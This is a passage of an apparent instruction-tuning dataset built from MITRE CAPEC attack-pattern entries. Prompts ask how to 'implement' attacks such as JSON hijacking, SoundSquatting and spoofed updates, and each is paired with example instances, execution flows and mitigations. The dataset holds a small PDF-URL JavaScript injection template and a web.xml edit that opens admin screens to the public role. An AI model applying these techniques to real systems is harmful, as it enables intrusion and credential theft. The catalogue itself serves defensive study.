            "xhtml:p": [
              "A MIME conversion buffer overflow exists in Sendmail versions 8.8.3 and 8.8.4. Sendmail versions 8.8.3 and 8.8.4 are vulnerable to a buffer overflow in the MIME handling code. By sending a message with specially-crafted headers to the server, a remote attacker can overflow a buffer and execute arbitrary commands on the system with root privileges.",
              "Sendmail performs a 7 bit to 8 bit conversion on email messages. This vulnerability is due to the fact that insufficient bounds checking was performed while performing these conversions. This gave attacker an opportunity to overwrite the internal stack of sendmail while it is executing with root privileges. An attacker first probes the target system to figure out what mail server is used on the system and what version. An attacker could then test out the exploit at their leisure on their own machine running the same version of the mail server before using it in the wild."
            ],
            "#text": "See also: CVE-1999-0047"
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "120"
            },
            {
              "@CWE_ID": "119"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-364"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances, Mitigations"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - JSON Hijacking (aka JavaScript Hijacking) (CAPEC ID: 111)",
    "context": "",
    "output": "Examples of JSON Hijacking (aka JavaScript Hijacking) (CAPEC ID: 111) are: Gmail service was found to be vulnerable to a JSON Hijacking attack that enabled an attacker to get the contents of the victim's address book. An attacker could send an e-mail to the victim's Gmail account (which ensures that the victim is logged in to Gmail when they receive it) with a link to the attackers' malicious site. If the victim clicked on the link, a request (containing the victim's authenticated session cookie) would be sent to the Gmail servers to fetch the victim's address book. This functionality is typically used by the Gmail service to get this data on the fly so that the user can be provided a list of contacts from which to choose the recipient of the e-mail.\n* When the JSON object with the contacts came back, it was loaded into the JavaScript space via a script tag on the attackers' malicious page. Since the JSON object was never assigned to a local variable (which would have prevented a script from a different domain accessing it due to the browser's same origin policy), another mechanism was needed to access the data that it contained. That mechanism was overwriting the internal array constructor with the attackers' own constructor in order to gain access to the JSON object's contents. These contents could then be transferred to the site controlled by the attacker.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Gmail service was found to be vulnerable to a JSON Hijacking attack that enabled an attacker to get the contents of the victim's address book. An attacker could send an e-mail to the victim's Gmail account (which ensures that the victim is logged in to Gmail when they receive it) with a link to the attackers' malicious site. If the victim clicked on the link, a request (containing the victim's authenticated session cookie) would be sent to the Gmail servers to fetch the victim's address book. This functionality is typically used by the Gmail service to get this data on the fly so that the user can be provided a list of contacts from which to choose the recipient of the e-mail.",
        "When the JSON object with the contacts came back, it was loaded into the JavaScript space via a script tag on the attackers' malicious page. Since the JSON object was never assigned to a local variable (which would have prevented a script from a different domain accessing it due to the browser's same origin policy), another mechanism was needed to access the data that it contained. That mechanism was overwriting the internal array constructor with the attackers' own constructor in order to gain access to the JSON object's contents. These contents could then be transferred to the site controlled by the attacker."
      ],
      "@Name": "JSON Hijacking (aka JavaScript Hijacking) (CAPEC ID: 111)",
      "attack_ptrn": {
        "@ID": "111",
        "@Name": "JSON Hijacking (aka JavaScript Hijacking)",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker targets a system that uses JavaScript Object Notation (JSON) as a transport mechanism between the client and the server (common in Web 2.0 systems using AJAX) to steal possibly confidential information transmitted from the server back to the client inside the JSON object by taking advantage of the loophole in the browser's Same Origin Policy that does not prohibit JavaScript from one website to be included and executed in the context of another website.",
        "Extended_Description": {
          "xhtml:p": [
            "An attacker gets the victim to visit their malicious page that contains a script tag whose source points to the vulnerable system with a URL that requests a response from the server containing a JSON object with possibly confidential information. The malicious page also contains malicious code to capture the JSON object returned by the server before any other processing on it can take place, typically by overriding the JavaScript function used to create new objects. This hook allows the malicious code to get access to the creation of each object and transmit the possibly sensitive contents of the captured JSON object to the attackers' server.",
            "There is nothing in the browser's security model to prevent the attackers' malicious JavaScript code (originating from attacker's domain) to set up an environment (as described above) to intercept a JSON object response (coming from the vulnerable target system's domain), read its contents and transmit to the attackers' controlled site. The same origin policy protects the domain object model (DOM), but not the JSON."
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "212",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Understand How to Request JSON Responses from the Target System] An attacker first explores the target system to understand what URLs need to be provided to it in order to retrieve JSON objects that contain information of interest to the attacker.",
              "Technique": "An attacker creates an account with the target system and observes requests and the corresponding JSON responses from the server. Understanding how to properly elicit responses from the server is crucial to the attackers' ability to craft the exploit."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": {
                "xhtml:p": [
                  "The attacker crafts a malicious website to which they plan to lure the victim who is using the vulnerable target system. The malicious website does two things:",
                  "This attack step leverages the fact that the same origin policy in the browser does not protect JavaScript originating from one domain from setting up an environment to intercept and access JSON objects arriving from a completely different domain."
                ],
                "xhtml:ul": {
                  "xhtml:li": [
                    "1. Contains a hook that intercepts incoming JSON objects, reads their contents and forwards the contents to the server controlled by the attacker (via a new XMLHttpRequest).",
                    "2. Uses the script tag with a URL in the source that requests a JSON object from the vulnerable target system. Once the JSON object is transmitted to the victim's browser, the malicious code (as described in step 1) intercepts that JSON object, steals its contents, and forwards to the attacker."
                  ]
                },
                "#text": "[Craft a malicious website]"
              }
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Launch JSON hijack] An attacker lures the victim to the malicious website or leverages other means to get their malicious code executing in the victim's browser. Once that happens, the malicious code makes a request to the victim target system to retrieve a JSON object with sensitive information. The request includes the victim's session cookie if the victim is logged in.",
              "Technique": "An attacker employs a myriad of standard techniques to get the victim to visit their malicious site or by some other means get the attackers' malicious code executing in the victim's browser."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "JSON is used as a transport mechanism between the client and the server",
            "The target server cannot differentiate real requests from forged requests",
            "The JSON object returned from the server can be accessed by the attackers' malicious code via a script tag"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Once this attack pattern is developed and understood, creating an exploit is not very complex.The attacker needs to have knowledge of the URLs that need to be accessed on the target system to request the JSON objects."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Ensure that server side code can differentiate between legitimate requests and forged requests. The solution is similar to protection against Cross Site Request Forger (CSRF), which is to use a hard to guess random nonce (that is unique to the victim's session with the server) that the attacker has no way of knowing (at least in the absence of other weaknesses). Each request from the client to the server should contain this nonce and the server should reject all requests that do not contain the nonce.",
            "On the client side, the system's design could make it difficult to get access to the JSON object content via the script tag. Since the JSON object is never assigned locally to a variable, it cannot be readily modified by the attacker before being used by a script tag. For instance, if while(1) was added to the beginning of the JavaScript returned by the server, trying to access it with a script tag would result in an infinite loop. On the other hand, legitimate client side code can remove the while(1) statement after which the JavaScript can be evaluated. A similar result can be achieved by surrounding the returned JavaScript with comment tags, or using other similar techniques (e.g. wrapping the JavaScript with HTML tags).",
            "Make the URLs in the system used to retrieve JSON objects unpredictable and unique for each user session.",
            "Ensure that to the extent possible, no sensitive data is passed from the server to the client via JSON objects. JavaScript was never intended to play that role, hence the same origin policy does not adequate address this scenario."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "Gmail service was found to be vulnerable to a JSON Hijacking attack that enabled an attacker to get the contents of the victim's address book. An attacker could send an e-mail to the victim's Gmail account (which ensures that the victim is logged in to Gmail when they receive it) with a link to the attackers' malicious site. If the victim clicked on the link, a request (containing the victim's authenticated session cookie) would be sent to the Gmail servers to fetch the victim's address book. This functionality is typically used by the Gmail service to get this data on the fly so that the user can be provided a list of contacts from which to choose the recipient of the e-mail.",
              "When the JSON object with the contacts came back, it was loaded into the JavaScript space via a script tag on the attackers' malicious page. Since the JSON object was never assigned to a local variable (which would have prevented a script from a different domain accessing it due to the browser's same origin policy), another mechanism was needed to access the data that it contained. That mechanism was overwriting the internal array constructor with the attackers' own constructor in order to gain access to the JSON object's contents. These contents could then be transferred to the site controlled by the attacker."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "345"
            },
            {
              "@CWE_ID": "346"
            },
            {
              "@CWE_ID": "352"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated @Abstraction"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - System Build Data Maliciously Altered (CAPEC ID: 678)",
    "context": "",
    "output": "Examples of System Build Data Maliciously Altered (CAPEC ID: 678) are: \u2018Make\u2019 is a program used for building executable programs and libraries from source code by executing commands and following rules in a \u2018makefile\u2019. It can create a malicious executable if commands or dependency paths in the makefile are maliciously altered to execute an unwanted command or reference as a dependency maliciously altered code.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "\u2018Make\u2019 is a program used for building executable programs and libraries from source code by executing commands and following rules in a \u2018makefile\u2019. It can create a malicious executable if commands or dependency paths in the makefile are maliciously altered to execute an unwanted command or reference as a dependency maliciously altered code.",
      "@Name": "System Build Data Maliciously Altered (CAPEC ID: 678)",
      "attack_ptrn": {
        "@ID": "678",
        "@Name": "System Build Data Maliciously Altered",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": "During the system build process, the system is deliberately misconfigured by the alteration of the build data. Access to system configuration data files and build processes is susceptible to deliberate misconfiguration of the system."
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "444"
          }
        },
        "Prerequisites": {
          "Prerequisite": "An adversary has access to the data files and processes used for executing system configuration and performing the build."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Execute Unauthorized Commands"
            },
            {
              "Scope": "Access Control",
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": [
                "Modify Data",
                "Read Data"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Implement configuration management security practices that protect the integrity of software and associated data.",
            "Monitor and control access to the configuration management system.",
            "Harden centralized repositories against attack.",
            "Establish acceptance criteria for configuration management check-in to assure integrity.",
            "Plan for and audit the security of configuration management administration processes.",
            "Maintain configuration control over operational systems."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "\u2018Make\u2019 is a program used for building executable programs and libraries from source code by executing commands and following rules in a \u2018makefile\u2019. It can create a malicious executable if commands or dependency paths in the makefile are maliciously altered to execute an unwanted command or reference as a dependency maliciously altered code."
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.002",
            "Entry_Name": "Supply Chain Compromise: Compromise Software Supply Chain"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-660"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-10-21"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are possible examples for implementing the attack pattern: Leverage Executable Code in Non-Executable Files (CAPEC ID: 35)",
    "context": "",
    "output": "Possible examples: Virtually any system that relies on configuration files for runtime behavior is open to this attack vector. The configuration files are frequently stored in predictable locations, so an attacker that can fingerprint a server process such as a web server or database server can quickly identify the likely locale where the configuration is stored. And this is of course not limited to server processes. Unix shells rely on profile files to store environment variables, search paths for programs and so on. If the aliases are changed, then a standard Unix \"cp\" command can be rerouted to \"rm\" or other standard command so the user's intention is subverted.\n* The attack can be directed at a client system, such as causing buffer overrun through loading seemingly benign image files, as in Microsoft Security Bulletin MS04-028 where specially crafted JPEG files could cause a buffer overrun once loaded into the browser.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Virtually any system that relies on configuration files for runtime behavior is open to this attack vector. The configuration files are frequently stored in predictable locations, so an attacker that can fingerprint a server process such as a web server or database server can quickly identify the likely locale where the configuration is stored. And this is of course not limited to server processes. Unix shells rely on profile files to store environment variables, search paths for programs and so on. If the aliases are changed, then a standard Unix \"cp\" command can be rerouted to \"rm\" or other standard command so the user's intention is subverted.",
        "The attack can be directed at a client system, such as causing buffer overrun through loading seemingly benign image files, as in Microsoft Security Bulletin MS04-028 where specially crafted JPEG files could cause a buffer overrun once loaded into the browser."
      ],
      "@Name": "Leverage Executable Code in Non-Executable Files (CAPEC ID: 35)",
      "attack_ptrn": {
        "@ID": "35",
        "@Name": "Leverage Executable Code in Non-Executable Files",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attack of this type exploits a system's trust in configuration and resource files. When the executable loads the resource (such as an image file or configuration file) the attacker has modified the file to either execute malicious code directly or manipulate the target process (e.g. application server) to execute based on the malicious configuration parameters. Since systems are increasingly interrelated mashing up resources from local and remote sources the possibility of this attack occurring is high.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "636"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "23"
            },
            {
              "@Nature": "PeerOf",
              "@CAPEC_ID": "75"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The attacker must have the ability to modify non-executable files consumed by the target software."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "To identify and execute against an over-privileged system interface"
          }
        },
        "Resources_Required": {
          "Resource": "Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Enforce principle of least privilege",
            "Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.",
            "Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.",
            "Implementation: Implement host integrity monitoring to detect any unwanted altering of configuration files.",
            "Implementation: Ensure that files that are not required to execute, such as configuration files, are not over-privileged, i.e. not allowed to execute."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Virtually any system that relies on configuration files for runtime behavior is open to this attack vector. The configuration files are frequently stored in predictable locations, so an attacker that can fingerprint a server process such as a web server or database server can quickly identify the likely locale where the configuration is stored. And this is of course not limited to server processes. Unix shells rely on profile files to store environment variables, search paths for programs and so on. If the aliases are changed, then a standard Unix \"cp\" command can be rerouted to \"rm\" or other standard command so the user's intention is subverted.",
            "The attack can be directed at a client system, such as causing buffer overrun through loading seemingly benign image files, as in Microsoft Security Bulletin MS04-028 where specially crafted JPEG files could cause a buffer overrun once loaded into the browser.",
            {
              "xhtml:p": [
                "Another example targets clients reading pdf files. In this case the attacker simply appends javascript to the end of a legitimate url for a pdf (http://www.gnucitizen.org/blog/danger-danger-danger/)",
                "http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here",
                "The client assumes that they are reading a pdf, but the attacker has modified the resource and loaded executable javascript into the client's browser process."
              ]
            },
            {
              "xhtml:p": [
                "The attack can also target server processes. The attacker edits the resource or configuration file, for example a web.xml file used to configure security permissions for a J2EE app server, adding role name \"public\" grants all users with the public role the ability to use the administration functionality.",
                "The server trusts its configuration file to be correct, but when they are manipulated, the attacker gains full control."
              ],
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "xhtml:div": {
                  "@style": "margin-left:1em;",
                  "xhtml:br": [
                    null,
                    null,
                    null
                  ],
                  "xhtml:div": {
                    "@style": "margin-left:1em;",
                    "xhtml:div": {
                      "@style": "margin-left:1em;",
                      "xhtml:br": null,
                      "#text": "<role-name>administrator</role-name><role-name>public</role-name>"
                    },
                    "xhtml:br": null,
                    "#text": "<auth-constraint>\n                        </auth-constraint>"
                  },
                  "#text": "<description>Security processing rules for admin screens</description><url-pattern>/admin/*</url-pattern><http-method>POST</http-method><http-method>GET</http-method>"
                },
                "xhtml:br": null,
                "#text": "< security-constraint>\n                  </security-constraint>"
              }
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "94"
            },
            {
              "@CWE_ID": "96"
            },
            {
              "@CWE_ID": "95"
            },
            {
              "@CWE_ID": "97"
            },
            {
              "@CWE_ID": "272"
            },
            {
              "@CWE_ID": "59"
            },
            {
              "@CWE_ID": "282"
            },
            {
              "@CWE_ID": "270"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1027.006",
              "Entry_Name": "Obfuscated Files or Information: HTML Smuggling"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1027.009",
              "Entry_Name": "Obfuscated Files or Information:\u00a0Embedded Payloads"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1564.009",
              "Entry_Name": "Hide Artifacts: Resource Forking"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description, Description Summary, Examples-Instances, Related_Attack_Patterns, Type (Attack_Pattern -> Relationship)"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Give me an usage example for attack pattern - Malicious Automated Software Update via Spoofing (CAPEC ID: 657)",
    "context": "",
    "output": "An example of the spoofing strategy would be the eTrust Antivirus Webscan Automated Update Remote Code Execution vulnerability (CVE-2006-3976) and (CVE-2006-3977) whereby an ActiveX control could be remotely manipulated by an attacker controlled web page to download and execute the attackers' code without integrity checking.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "An example of the spoofing strategy would be the eTrust Antivirus Webscan Automated Update Remote Code Execution vulnerability (CVE-2006-3976) and (CVE-2006-3977) whereby an ActiveX control could be remotely manipulated by an attacker controlled web page to download and execute the attackers' code without integrity checking.",
      "@Name": "Malicious Automated Software Update via Spoofing (CAPEC ID: 657)",
      "attack_ptrn": {
        "@ID": "657",
        "@Name": "Malicious Automated Software Update via Spoofing",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attackers uses identify or content spoofing to trick a client into performing an automated software update from a malicious source. A malicious automated software update that leverages spoofing can include content or identity spoofing as well as protocol spoofing. Content or identity spoofing attacks can trigger updates in software by embedding scripted mechanisms within a malicious web page, which masquerades as a legitimate update source. Scripting mechanisms communicate with software components and trigger updates from locations specified by the attackers' server. The result is the client believing there is a legitimate software update available but instead downloading a malicious update from the attacker.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "186",
            "Exclude_Related": {
              "@Exclude_ID": "403"
            }
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Access Control",
              "Availability",
              "Confidentiality"
            ],
            "Impact": "Execute Unauthorized Commands"
          }
        },
        "Example_Instances": {
          "Example": "An example of the spoofing strategy would be the eTrust Antivirus Webscan Automated Update Remote Code Execution vulnerability (CVE-2006-3976) and (CVE-2006-3977) whereby an ActiveX control could be remotely manipulated by an attacker controlled web page to download and execute the attackers' code without integrity checking."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "494"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1072",
            "Entry_Name": "Software Deployment Tools"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-12-17"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2022-09-29",
            "Modification_Comment": "Updated Taxonomy_Mappings"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - SoundSquatting (CAPEC ID: 631)",
    "context": "",
    "output": "Examples of SoundSquatting (CAPEC ID: 631) are: An adversary sends an email, impersonating the popular banking website guaranteebanking.com, to a user stating that they have just received a new deposit and to click the given link to confirm the deposit.\n- However, the link the in email is guarantybanking.com instead of guaranteebanking.com, which the user clicks without fully reading the link.\n- The user is directed to the adversary's website, which appears as if it is the legitimate guaranteebanking.com login page.\n- The user thinks they are logging into their account, but have actually just given their guaranteebanking.com credentials to the adversary. The adversary can now use the user's legitimate guaranteebanking.com credentials to log into the user's account and steal any money which may be in the account.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary sends an email, impersonating the popular banking website guaranteebanking.com, to a user stating that they have just received a new deposit and to click the given link to confirm the deposit.",
        "However, the link the in email is guarantybanking.com instead of guaranteebanking.com, which the user clicks without fully reading the link.",
        "The user is directed to the adversary's website, which appears as if it is the legitimate guaranteebanking.com login page.",
        "The user thinks they are logging into their account, but have actually just given their guaranteebanking.com credentials to the adversary. The adversary can now use the user's legitimate guaranteebanking.com credentials to log into the user's account and steal any money which may be in the account."
      ],
      "@Name": "SoundSquatting (CAPEC ID: 631)",
      "attack_ptrn": {
        "@ID": "631",
        "@Name": "SoundSquatting",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary registers a domain name that sounds the same as a trusted domain, but has a different spelling. A SoundSquatting attack takes advantage of a user's confusion of the two words to direct Internet traffic to adversary-controlled destinations. SoundSquatting does not require an attack against the trusted domain or complicated reverse engineering.",
        "Alternate_Terms": {
          "Alternate_Term": {
            "Term": "Homophone Attack"
          }
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "616",
              "Exclude_Related": [
                {
                  "@Exclude_ID": "437"
                },
                {
                  "@Exclude_ID": "512"
                },
                {
                  "@Exclude_ID": "513"
                },
                {
                  "@Exclude_ID": "515"
                }
              ]
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "89"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "543"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted, receives a consistent amount of traffic, and is a homophone.",
              "Technique": "Research popular or high traffic websites which are also homophones."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the SoundSquatted URL.",
              "Technique": "Register the SoundSquatted domain."
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the SoundSquatted domain.",
              "Technique": [
                "Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the SoundSquatted domain.",
                "Assume that a user will unintentionally use the homophone in the URL, leading the user to the SoundSquatted domain."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Adversaries must be able to register DNS hostnames/URL\u2019s."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Other",
            "Impact": "Other",
            "Note": "Depending on the intention of the adversary, a successful SoundSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials."
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Authenticate all servers and perform redundant checks when using DNS hostnames.",
            "Purchase potential SoundSquatted domains and forward to legitimate domain."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "An adversary sends an email, impersonating the popular banking website guaranteebanking.com, to a user stating that they have just received a new deposit and to click the given link to confirm the deposit.",
              "However, the link the in email is guarantybanking.com instead of guaranteebanking.com, which the user clicks without fully reading the link.",
              "The user is directed to the adversary's website, which appears as if it is the legitimate guaranteebanking.com login page.",
              "The user thinks they are logging into their account, but have actually just given their guaranteebanking.com credentials to the adversary. The adversary can now use the user's legitimate guaranteebanking.com credentials to log into the user's account and steal any money which may be in the account."
            ],
            "#text": "See also: SoundSquatting vulnerability allows an adversary to impersonate a trusted domain and leverages a user's confusion between the meaning of two words which are pronounced the same into visiting the malicious website to steal user credentials."
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-491"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - AJAX Footprinting (CAPEC ID: 85)",
    "context": "",
